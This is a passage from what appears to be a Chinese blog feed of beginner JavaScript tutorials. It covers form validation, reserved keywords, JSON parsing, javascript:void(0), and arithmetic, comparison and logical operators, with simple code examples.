class="hljs-string">&quot;@&quot;</span>);        <br><span class="hljs-keyword">var</span> dotpos=x.lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>);        <br><span class="hljs-keyword">if</span> (atpos&lt;<span class="hljs-number">1</span> || dotpos&lt;atpos+<span class="hljs-number">2</span> || dotpos+<span class="hljs-number">2</span>&gt;=x.length)        <br>  &#123;        <br>  alert(<span class="hljs-string">&quot;Not a valid e-mail address&quot;</span>);        <br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        <br>  &#125;       <br>&#125;<br></code></pre></div></td></tr></table></figure><p>实例：连同 HTML 表单的完整代码。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_form.asp&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm();&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br>Email: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="3-3-数字验证"><a href="#3-3-数字验证" class="headerlink" title="3.3 数字验证"></a>3.3 数字验证</h3><p>函数检查输入的数据是否是1~10之间的数字。假如输入的不为数字或不是，那么警告框会弹出，并且函数的返回值为 false，否则函数的返回值则为 true（意味着数据没有问题）。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;myForm&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo_form.asp&quot;</span> <span class="hljs-attr">onsubmit</span>=<span class="hljs-string">&quot;return validateForm();&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>请输入1到10之间的数字：<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;number&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;myFunction()&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-JavaScript-保留关键字"><a href="#4-JavaScript-保留关键字" class="headerlink" title="4.JavaScript 保留关键字"></a>4.JavaScript 保留关键字</h2><p>保留关键字在意思上表达成为将来的关键字而保留的单词。在 JavaScript 中，一些标识符是保留关键字，不能用作变量名或函数名。</p><p>Javascript 的保留关键字不可以用作变量、标签或者函数名。有些保留关键字是作为 Javascript 以后扩展使用。</p><table><thead><tr><th align="center">abstract</th><th align="center">arguments</th><th align="center">boolean</th><th align="center">break</th><th align="center">byte</th></tr></thead><tbody><tr><td align="center">case</td><td align="center">catch</td><td align="center">char</td><td align="center">class*</td><td align="center">const</td></tr><tr><td align="center">continue</td><td align="center">debugger</td><td align="center">default</td><td align="center">delete</td><td align="center">do</td></tr><tr><td align="center">double</td><td align="center">else</td><td align="center">enum*</td><td align="center">eval</td><td align="center">export*</td></tr><tr><td align="center">extends*</td><td align="center">false</td><td align="center">final</td><td align="center">finally</td><td align="center">float</td></tr><tr><td align="center">for</td><td align="center">function</td><td align="center">goto</td><td align="center">if</td><td align="center">implements</td></tr><tr><td align="center">import*</td><td align="center">in</td><td align="center">instanceof</td><td align="center">int</td><td align="center">interface</td></tr><tr><td align="center">let</td><td align="center">long</td><td align="center">native</td><td align="center">new</td><td align="center">null</td></tr><tr><td align="center">package</td><td align="center">private</td><td align="center">protected</td><td align="center">public</td><td align="center">return</td></tr><tr><td align="center">short</td><td align="center">static</td><td align="center">super*</td><td align="center">switch</td><td align="center">synchronized</td></tr><tr><td align="center">this</td><td align="center">throw</td><td align="center">throws</td><td align="center">transient</td><td align="center">true</td></tr><tr><td align="center">try</td><td align="center">typeof</td><td align="center">var</td><td align="center">void</td><td align="center">volatile</td></tr><tr><td align="center">while</td><td align="center">with</td><td align="center">yield</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>* 标记的关键字是 ECMAScript5 中新添加的。</p><h3 id="4-1-JavaScript-对象、属性和方法"><a href="#4-1-JavaScript-对象、属性和方法" class="headerlink" title="4.1 JavaScript 对象、属性和方法"></a>4.1 JavaScript 对象、属性和方法</h3><p>也应该避免使用 JavaScript 内置的对象、属性和方法的名称作为 Javascript 的变量或函数名。</p><table><thead><tr><th align="center">Array</th><th align="center">Date</th><th align="center">eval</th><th align="center">function</th><th align="center">hasOwnProperty</th></tr></thead><tbody><tr><td align="center">Infinity</td><td align="center">isFinite</td><td align="center">isNaN</td><td align="center">isPrototypeOf</td><td align="center">length</td></tr><tr><td align="center">Math</td><td align="center">NaN</td><td align="center">name</td><td align="center">Number</td><td align="center">Object</td></tr><tr><td align="center">prototype</td><td align="center">String</td><td align="center">toString</td><td align="center">undefined</td><td align="center">valueOf</td></tr></tbody></table><h3 id="4-2-Java-保留关键字"><a href="#4-2-Java-保留关键字" class="headerlink" title="4.2 Java 保留关键字"></a>4.2 Java 保留关键字</h3><p>JavaScript 经常与 Java 一起使用。应该避免使用一些 Java 对象和属性作为 JavaScript 标识符。</p><table><thead><tr><th align="center">getClass</th><th align="center">java</th><th align="center">JavaArray</th><th align="center">javaClass</th><th align="center">JavaObject</th><th align="center">JavaPackage</th></tr></thead></table><h3 id="4-3-Windows-保留关键字"><a href="#4-3-Windows-保留关键字" class="headerlink" title="4.3 Windows 保留关键字"></a>4.3 Windows 保留关键字</h3><p>JavaScript 可以在 HTML 外部使用。它可在许多其他应用程序中作为编程语言使用。在 HTML 中，必须（为了可移植性，您也应该这么做）避免使用 HTML 和 Windows 对象和属性的名称作为 Javascript 的变量及函数名。</p><table><thead><tr><th align="center">alert</th><th align="center">all</th><th align="center">anchor</th><th align="center">anchors</th><th align="center">area</th></tr></thead><tbody><tr><td align="center">assign</td><td align="center">blur</td><td align="center">button</td><td align="center">checkbox</td><td align="center">clearInterval</td></tr><tr><td align="center">clearTimeout</td><td align="center">clientInformation</td><td align="center">close</td><td align="center">closed</td><td align="center">confirm</td></tr><tr><td align="center">constructor</td><td align="center">crypto</td><td align="center">decodeURI</td><td align="center">decodeURIComponent</td><td align="center">defaultStatus</td></tr><tr><td align="center">document</td><td align="center">element</td><td align="center">elements</td><td align="center">embed</td><td align="center">embeds</td></tr><tr><td align="center">encodeURI</td><td align="center">encodeURIComponent</td><td align="center">escape</td><td align="center">event</td><td align="center">fileUpload</td></tr><tr><td align="center">focus</td><td align="center">form</td><td align="center">forms</td><td align="center">frame</td><td align="center">innerHeight</td></tr><tr><td align="center">innerWidth</td><td align="center">layer</td><td align="center">layers</td><td align="center">link</td><td align="center">location</td></tr><tr><td align="center">mimeTypes</td><td align="center">navigate</td><td align="center">navigator</td><td align="center">frames</td><td align="center">frameRate</td></tr><tr><td align="center">hidden</td><td align="center">history</td><td align="center">image</td><td align="center">images</td><td align="center">offscreenBuffering</td></tr><tr><td align="center">open</td><td align="center">opener</td><td align="center">option</td><td align="center">outerHeight</td><td align="center">outerWidth</td></tr><tr><td align="center">packages</td><td align="center">pageXOffset</td><td align="center">pageYOffset</td><td align="center">parent</td><td align="center">parseFloat</td></tr><tr><td align="center">parseInt</td><td align="center">password</td><td align="center">pkcs11</td><td align="center">plugin</td><td align="center">prompt</td></tr><tr><td align="center">propertyIsEnum</td><td align="center">radio</td><td align="center">reset</td><td align="center">screenX</td><td align="center">screenY</td></tr><tr><td align="center">scroll</td><td align="center">secure</td><td align="center">select</td><td align="center">self</td><td align="center">setInterval</td></tr><tr><td align="center">setTimeout</td><td align="center">status</td><td align="center">submit</td><td align="center">taint</td><td align="center">text</td></tr><tr><td align="center">textarea</td><td align="center">top</td><td align="center">unescape</td><td align="center">untaint</td><td align="center">window</td></tr></tbody></table><h3 id="4-4-HTML-事件句柄"><a href="#4-4-HTML-事件句柄" class="headerlink" title="4.4 HTML 事件句柄"></a>4.4 HTML 事件句柄</h3><p>还应该避免使用 HTML 事件句柄的名称作为 Javascript 的变量及函数名。</p><table><thead><tr><th align="center">onblur</th><th align="center">onclick</th><th align="center">onerror</th><th align="center">onfocus</th></tr></thead><tbody><tr><td align="center">onkeydown</td><td align="center">onkeypress</td><td align="center">onkeyup</td><td align="center">onmouseover</td></tr><tr><td align="center">onload</td><td align="center">onmouseup</td><td align="center">onmousedown</td><td align="center">onsubmit</td></tr></tbody></table><p>在JavaScript中关键字不能用作变量名或者函数名，否则可能会得到错误消息，例如“”Identifier Expected”（应该有标识符、期望标识符）”。</p><h3 id="4-5-非标准-JavaScript"><a href="#4-5-非标准-JavaScript" class="headerlink" title="4.5 非标准 JavaScript"></a>4.5 非标准 JavaScript</h3><p>除了保留关键字，在 JavaScript 实现中也有一些非标准的关键字。一个实例是 const 关键字，用于定义变量。 一些 JavaScript 引擎把 const 当作 var 的同义词。另一些引擎则把 const 当作只读变量的定义。<br>Const 是 JavaScript 的扩展。JavaScript 引擎支持它用在 Firefox 和 Chrome 中。但是它并不是 JavaScript 标准 ES3 或 ES5 的组成部分。最好不要使用它。</p><h2 id="5-JavaScript-JSON"><a href="#5-JavaScript-JSON" class="headerlink" title="5.JavaScript JSON"></a>5.JavaScript JSON</h2><p>JSON 是用于存储和传输数据的格式。JSON 通常用于服务端向网页传递数据 。</p><p>JSON 英文全称 JavaScript Object Notation，是一种轻量级的数据交换格式。JSON是独立的语言、易于理解。JSON 使用 JavaScript 语法，但是 JSON 格式仅仅是一个文本。文本可以被任何编程语言读取及作为数据格式传递。</p><h3 id="5-1-实例"><a href="#5-1-实例" class="headerlink" title="5.1 实例"></a>5.1 实例</h3><p>使用实例：定义 employees 对象: 3 条员工记录（对象）的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;<span class="hljs-string">&quot;employees&quot;</span>:[<br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Doe&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;Anna&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Smith&quot;</span>&#125;,<br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;Peter&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Jones&quot;</span>&#125;<br>]&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-2-格式化后为-JavaScript-对象"><a href="#5-2-格式化后为-JavaScript-对象" class="headerlink" title="5.2 格式化后为 JavaScript 对象"></a>5.2 格式化后为 JavaScript 对象</h3><p>JSON 格式在语法上与创建 JavaScript 对象代码是相同的。由于它们很相似，所以 JavaScript 程序可以很容易的将 JSON 数据转换为 JavaScript 对象。</p><p>JSON 语法规则：</p><blockquote><ol><li>数据为 键/值 对。</li><li>数据由逗号分隔。</li><li>大括号保存对象</li><li>方括号保存数组</li></ol></blockquote><h3 id="5-3-JSON-数据-一个名称对应一个值"><a href="#5-3-JSON-数据-一个名称对应一个值" class="headerlink" title="5.3 JSON 数据 - 一个名称对应一个值"></a>5.3 JSON 数据 - 一个名称对应一个值</h3><p>JSON 数据格式为 键/值 对，就像 JavaScript 对象属性。键/值对包括字段名称（在双引号中），后面一个冒号，然后是值。</p><figure class="highlight 1c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 1c"><span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;John&quot;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-4-JSON-对象"><a href="#5-4-JSON-对象" class="headerlink" title="5.4 JSON 对象"></a>5.4 JSON 对象</h3><p>JSON 对象保存在大括号内。就像在 JavaScript 中, 对象可以保存多个 键/值 对。</p><figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-attr">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Doe&quot;</span>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-5-JSON-数组"><a href="#5-5-JSON-数组" class="headerlink" title="5.5 JSON 数组"></a>5.5 JSON 数组</h3><p>JSON 数组保存在中括号内。就像在 JavaScript 中, 数组可以包含对象。<br>对象 “employees” 是一个数组。包含了三个对象。每个对象为员工的记录（姓和名）。</p><figure class="highlight prolog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs prolog"><span class="hljs-string">&quot;employees&quot;</span>:[        <br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Doe&quot;</span>&#125;,        <br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;Anna&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Smith&quot;</span>&#125;,     <br>    &#123;<span class="hljs-string">&quot;firstName&quot;</span>:<span class="hljs-string">&quot;Peter&quot;</span>, <span class="hljs-string">&quot;lastName&quot;</span>:<span class="hljs-string">&quot;Jones&quot;</span>&#125;        <br>]<br></code></pre></div></td></tr></table></figure><h3 id="5-6-字符串转换为-JavaScript-对象"><a href="#5-6-字符串转换为-JavaScript-对象" class="headerlink" title="5.6 字符串转换为 JavaScript 对象"></a>5.6 字符串转换为 JavaScript 对象</h3><p>通常我们从服务器中读取 JSON 数据，并在网页中显示数据。简单起见，我们网页中直接设置 JSON 字符串。</p><p>首先，创建 JavaScript 字符串，字符串为 JSON 格式的数据：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> text = <span class="hljs-string">&#x27;&#123; &quot;employees&quot; : [&#x27;</span> +<br><span class="hljs-string">&#x27;&#123; &quot;firstName&quot;:&quot;John&quot; , &quot;lastName&quot;:&quot;Doe&quot; &#125;,&#x27;</span> +<br><span class="hljs-string">&#x27;&#123; &quot;firstName&quot;:&quot;Anna&quot; , &quot;lastName&quot;:&quot;Smith&quot; &#125;,&#x27;</span> +<br><span class="hljs-string">&#x27;&#123; &quot;firstName&quot;:&quot;Peter&quot; , &quot;lastName&quot;:&quot;Jones&quot; &#125; ]&#125;&#x27;</span>;<br></code></pre></div></td></tr></table></figure><p>然后，使用 JavaScript 内置函数 JSON.parse() 将字符串转换为 JavaScript 对象:</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> obj = <span class="hljs-built_in">JSON</span>.parse(text);<br></code></pre></div></td></tr></table></figure><p>最后，在页面中使用新的 JavaScript 对象：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">&lt;p id=<span class="hljs-string">&quot;demo&quot;</span>&gt;&lt;/p&gt;<br><br>&lt;script&gt;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;demo&quot;</span>).innerHTML =<br>obj.employees[<span class="hljs-number">1</span>].firstName + <span class="hljs-string">&quot; &quot;</span> + obj.employees[<span class="hljs-number">1</span>].lastName;<br>&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><h2 id="6-javascript-void-0-含义"><a href="#6-javascript-void-0-含义" class="headerlink" title="6.javascript:void(0) 含义"></a>6.javascript:void(0) 含义</h2><p>javascript:void(0) 中最关键的是 void 关键字， void 是 JavaScript 中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。</p><p>使用实例：创建超级链接，当点击后不会发生任何事。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0)&quot;</span>&gt;</span>单击此处什么也不会发生<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>当用户链接时，void(0) 计算为 0，但 Javascript 上没有任何效果。</p><p>使用实例：点击链接后显示警告信息。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-comment">//--&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(alert(&#x27;Warning!!!&#x27;))&quot;</span>&gt;</span>点我!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="6-1-href-”-”与href-”javascript-void-0-”的区别"><a href="#6-1-href-”-”与href-”javascript-void-0-”的区别" class="headerlink" title="6.1 href=”#”与href=”javascript:void(0)”的区别"></a>6.1 href=”#”与href=”javascript:void(0)”的区别</h3><p># 包含了一个位置信息，默认的锚是#top 也就是网页的上端。而javascript:void(0), 仅仅表示一个死链接。在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id。如果要定义一个死链接使用 javascript:void(0) 。</p><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;javascript:void(0);&quot;</span>&gt;</span>点我没有反应的!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;#pos&quot;</span>&gt;</span>点我定位到指定位置!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pos&quot;</span>&gt;</span>尾部定位点<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>void()仅仅是代表不返回任何值，但是括号内的表达式还是要运行。</p><hr>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-JavaScript学习（四）</title>
    <link href="/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/18/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-JavaScript%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JavaScript 是世界上最流行的脚本语言。 JavaScript 是属于 web 的语言，它适用于 PC、笔记本电脑、平板电脑和移动电话。 JavaScript 被设计为向 HTML 页面增加交互性。 许多 HTML 开发者都不是程序员，但是 JavaScript 却拥有非常简单的语法。几乎每个人都有能力将小的 JavaScript 片段添加到网页中。所有现代的 HTML 页面都使用 JavaScript，可以用于改进设计、验证表单、检测浏览器、创建cookies等。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-JavaScript-运算符"><a href="#1-JavaScript-运算符" class="headerlink" title="1.JavaScript 运算符"></a>1.JavaScript 运算符</h2><p>JavaScript中的三种类型的运算符：算术运算符、赋值运算符以及字符串连接运算符。</p><p>运算符 = 用于赋值。<br>运算符 + 用于加值。</p><p>实例：</p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">y=<span class="hljs-number">5</span>;<br>z=<span class="hljs-number">2</span>;<br>x=y+z;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-JavaScript-算术运算符"><a href="#1-2-JavaScript-算术运算符" class="headerlink" title="1.2 JavaScript 算术运算符"></a>1.2 JavaScript 算术运算符</h3><p>算术运算符用于执行变量与/或值之间的算术运算。</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">+</td><td align="center">加法</td></tr><tr><td align="center">-</td><td align="center">减法</td></tr><tr><td align="center">*</td><td align="center">乘法</td></tr><tr><td align="center">/</td><td align="center">除法</td></tr><tr><td align="center">%</td><td align="center">取模（余数）</td></tr><tr><td align="center">++</td><td align="center">自增</td></tr><tr><td align="center">–</td><td align="center">自减</td></tr></tbody></table><h3 id="1-3-JavaScript-赋值运算符"><a href="#1-3-JavaScript-赋值运算符" class="headerlink" title="1.3 JavaScript 赋值运算符"></a>1.3 JavaScript 赋值运算符</h3><table><thead><tr><th align="center">运算符</th><th align="center">等同于</th></tr></thead><tbody><tr><td align="center">x=x</td><td align="center"></td></tr><tr><td align="center">x+=y</td><td align="center">x=x+y</td></tr><tr><td align="center">x-=y</td><td align="center">x=x-y</td></tr><tr><td align="center">x*=y</td><td align="center">x=x*y</td></tr><tr><td align="center">x/=y</td><td align="center">x=x/y</td></tr><tr><td align="center">x%=y</td><td align="center">x=x%y</td></tr></tbody></table><h3 id="1-4-用于字符串的-运算符"><a href="#1-4-用于字符串的-运算符" class="headerlink" title="1.4 用于字符串的 + 运算符"></a>1.4 用于字符串的 + 运算符</h3><ul><li>运算符用于把文本值或字符串变量加起来（连接起来）。<br>使用实例：把两个或多个字符串变量连接起来<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">txt1=<span class="hljs-string">&quot;What a very&quot;</span>;<br>txt2=<span class="hljs-string">&quot;nice day&quot;</span>;<br>txt3=txt1+txt2;<br></code></pre></div></td></tr></table></figure><h3 id="1-5-对字符串和数字进行加法运算"><a href="#1-5-对字符串和数字进行加法运算" class="headerlink" title="1.5 对字符串和数字进行加法运算"></a>1.5 对字符串和数字进行加法运算</h3>两个数字相加，返回数字相加的和，如果数字与字符串相加，返回字符串。<br>实例：<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">x=<span class="hljs-number">5</span>+<span class="hljs-number">5</span>;<br>y=<span class="hljs-string">&quot;5&quot;</span>+<span class="hljs-number">5</span>;<br>z=<span class="hljs-string">&quot;Hello&quot;</span>+<span class="hljs-number">5</span>;<br><span class="hljs-comment">/*输出结果*/</span><br><span class="hljs-number">10</span><br><span class="hljs-number">55</span><br>Hello5<br></code></pre></div></td></tr></table></figure><h3 id="1-6-JavaScript运算符学习脑图"><a href="#1-6-JavaScript运算符学习脑图" class="headerlink" title="1.6 JavaScript运算符学习脑图"></a>1.6 JavaScript运算符学习脑图</h3></li></ul><p><img src="https://img-blog.csdnimg.cn/20210517131724439.png"></p><h2 id="2-JavaScript-比较和逻辑运算符"><a href="#2-JavaScript-比较和逻辑运算符" class="headerlink" title="2.JavaScript 比较和逻辑运算符"></a>2.JavaScript 比较和逻辑运算符</h2><p>比较和逻辑运算符用于测试 true 或者 false。</p><h3 id="2-1-比较运算符"><a href="#2-1-比较运算符" class="headerlink" title="2.1 比较运算符"></a>2.1 比较运算符</h3><p>比较运算符在逻辑语句中使用，以测定变量或值是否相等。(x=5)</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">比较</th><th align="center">返回值</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td><td align="center">x==8</td><td align="center"><em>false</em></td></tr><tr><td align="center">===</td><td align="center">绝对等于（值和类型均相等）</td><td align="center">x===”5”</td><td align="center"><em>false</em></td></tr><tr><td align="center">!=</td><td align="center">不等于</td><td align="center">x!=8</td><td align="center"><em>true</em></td></tr><tr><td align="center">!==</td><td align="center">不绝对等于（值和类型有一个不相等，或两个都不相等）</td><td align="center">x!==”5”</td><td align="center"><em>true</em></td></tr><tr><td align="center">&gt;</td><td align="center">大于</td><td align="center">x&gt;8</td><td align="center"><em>false</em></td></tr><tr><td align="center">&lt;</td><td align="center">小于</td><td align="center">x&lt;8</td><td align="center"><em>true</em></td></tr><tr><td align="center">&gt;=</td><td align="center">大于或等于</td><td align="center">x&gt;=8</td><td align="center"><em>false</em></td></tr><tr><td align="center">&lt;=</td><td align="center">小于或等于</td><td align="center">x&lt;=8</td><td align="center"><em>true</em></td></tr></tbody></table><h3 id="2-2-逻辑运算符"><a href="#2-2-逻辑运算符" class="headerlink" title="2.2 逻辑运算符"></a>2.2 逻辑运算符</h3><p>逻辑运算符用于测定变量或值之间的逻辑。给定 x=6 以及 y=3。</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">实例</th></tr></thead><tbody><tr><td align="center">&amp;&amp;</td><td align="center">and</td><td align="center">(x &lt; 10 &amp;&amp; y &gt; 1) 为 true</td></tr><tr><td align="center">||</td><td align="center">or</td><td align="center">(x==5 || y==5) 为 false</td></tr><tr><td align="center">!</td><td align="center">not</td><td align="center">!(x==y) 为 true</td></tr></tbody></table><p>逻辑运算符的优先级是：！、&amp;&amp; 、||。</p><h3 id="2-3-条件运算符"><a href="#2-3-条件运算符" class="headerlink" title="2.3 条件运算符"></a>2.3 条件运算符</h3><p>JavaScript 还包含了基于某些条件对变量进行赋值的条件运算符。<br>语法：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">variablename</span>=(condition)?value<span class="hljs-number">1</span>:value<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure><p>使用实例：如果变量 